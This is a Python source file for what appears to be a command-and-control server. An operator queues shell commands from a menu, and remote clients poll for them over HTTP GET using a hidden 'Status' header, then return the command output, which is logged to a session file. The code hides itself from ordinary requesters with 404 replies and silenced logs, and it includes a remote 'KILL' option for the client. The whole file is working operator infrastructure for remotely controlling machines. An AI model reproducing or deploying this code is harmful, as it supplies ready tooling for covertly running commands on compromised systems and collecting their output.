import os
import argparse
import json
import zlib
from threading import Thread
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from time import sleep
from tasks import Task, Task_Manager
TASK_MANAGER = Task_Manager()
SERVER_IP = "0.0.0.0"
SERVER_PORT = 9000
global OS_CLEAR_COMMAND
global SHOULD_NOTIFY
global SHOULD_EXIT
global SERVER_THREAD
global SERVER

class ClientHandler(BaseHTTPRequestHandler):
    """ 
    A custom request handler, that checks for a GET method custom header field 'Status'.
    Valid Status types are:
    - task
    - result

    You can add another status type here to add in additional functionality 
    or use another method like HEAD, POST, TRACE, etc...
    """
    def do_HEAD(self):
        self.send_response_only(404)
    def do_POST(self):
        self.send_response_only(404)
    def do_GET(self):
        global SHOULD_NOTIFY
        global SHOULD_EXIT
        """ 
        This handles the GET request. Ended up putting the result in the request body
        since content length is auto calculated by most tools, allows for easy testing
        with postman or standard browser developer tools.
        """
        # The client will write task or result in the Status header field.
        client_command = self.headers['Status']
        client_size = self.headers['Content-Length']
        if client_command:
            self.send_response(200)
            # if the request has our header field, Set the response content-type as json
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            if client_command == "task":
                # Client is checking for tasks
                if TASK_MANAGER.unstarted_tasks._qsize() > 0:
                    if SHOULD_NOTIFY:
                        print("\nA client picked up a task. Press enter...\n")
                queue_status = TASK_MANAGER.get_task()
                queue_status = zlib.compress(queue_status)
                self.wfile.write(queue_status)
            elif client_command == "result":
                # Client is sending a result
                task_result = zlib.decompress(self.rfile.read(int(client_size)))
                task_result = json.loads(task_result)
                TASK_MANAGER.complete_task(task_result)
                if SHOULD_NOTIFY and task_result != "KILLED":
                    print("\nA client has completed a task. Press enter...\n")
                if task_result == "KILLED":
                    SHOULD_EXIT = True
            # Send off our client response with a 200
        else:
            # Tell the requester, nothing to see here...
            self.send_response(404)
    def log_message(self, format, *args):
        # Silencing the server, so it doesn't pollute the screen
        return()
        

def queue_task():
    """ Allows the user to enter a command that the client will execute """
    os.system(OS_CLEAR_COMMAND)
    command_to_run = input("Command To Queue > ")
    if command_to_run:
        TASK_MANAGER.add_task(Task(command_to_run))


def view_results():
    """ Allows the user to view current tasks, and shows up to 50 characters of completed ones """
    os.system(OS_CLEAR_COMMAND)
    TASK_MANAGER.get_completed_tasks()
    input("Press Enter to continue")

def start_server():
    """ Start running the server on the SERVER_IP and SERVER_PORT """
    global SERVER_THREAD
    global SERVER
    os.system(OS_CLEAR_COMMAND)
    print(f"starting server on {SERVER_IP}:{SERVER_PORT}")
    print(f"completed commands will be written to session_log.json")
    ClientHandler.TASK_MANAGER = TASK_MANAGER
    SERVER = ThreadingHTTPServer((SERVER_IP, SERVER_PORT), ClientHandler)
    SERVER_THREAD = Thread(target = SERVER.serve_forever)
    SERVER_THREAD.daemon = True
    SERVER_THREAD.start()


def stop_server(status="Exiting"):
    """ Stops the running server """
    global SERVER_THREAD
    global SERVER
    # stop the server
    os.system(OS_CLEAR_COMMAND)
    print(status)
    print(f"stopping server on {SERVER_IP}:{SERVER_PORT}...")
    SERVER.shutdown()
    SERVER_THREAD.join()
    exit()


def server_repl(user_choice="-1"):
    global SHOULD_NOTIFY
    global SHOULD_EXIT
    """ Provides a REPL that allows the user to queue a task or view queued tasks """
    available_options = """
    1. Enter a command to queue
    2. Check Results
    3. KILL, will clear queue and schedule kill.
    0. Exit
    """
    try:
        while(user_choice != "0"):
            if user_choice == "1":
                queue_task()
            elif user_choice == "2":
                view_results()
            elif user_choice == "3":
                TASK_MANAGER.kill_client()
                os.system(OS_CLEAR_COMMAND)
                user_choice = "4"
                print("Kill scheduled...")
                print("Please wait.", end="")
                SHOULD_NOTIFY = False
                while SHOULD_EXIT != True:
                    print(".", end="", flush=True)
                    sleep(1)
                print("\nReceived Kill Confirmation")
                sleep(3)
            os.system(OS_CLEAR_COMMAND)
            print(available_options)
            user_choice = input("> ")
        tear_down()
    except KeyboardInterrupt:
        tear_down()

def main():
    """ The main function to kick things off """
    os.system(OS_CLEAR_COMMAND)
    # start server
    start_server()
    # initialize the repl
    server_repl()


def tear_down():
    global SHOULD_NOTIFY
    """ Used as a final catch to ensure the user would like to quit, don't want them quiting on accident """
    # make sure the user wants to quit
    confirm = input("\nWould you like to quit? y for yes: ")
    if confirm == "y":
        # stop the server
        stop_server()
    else:
        server_repl()
        SHOULD_NOTIFY = True


if __name__ == "__main__":
    if os.name == "nt":
        OS_CLEAR_COMMAND = "cls"
    else:
        OS_CLEAR_COMMAND = "clear"
    SHOULD_NOTIFY = True
    SHOULD_EXIT = False
    arg_parser = argparse.ArgumentParser(
        description="Starts a server and allows an operator to queue tasks for a client to execute", 
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    arg_parser.add_argument("-ip", default="0.0.0.0", help="The IP address of the interface you would like to listen on")
    arg_parser.add_argument("-port", default="9000", help="The port you would like to listen on")
    parsed_args = arg_parser.parse_args()
    SERVER_IP = parsed_args.ip
    SERVER_PORT = int(parsed_args.port)
    # Quick check to see if log file exists.
    if not os.path.exists("./session_log.json"):
        open("session_log.json", "a").close()
    main()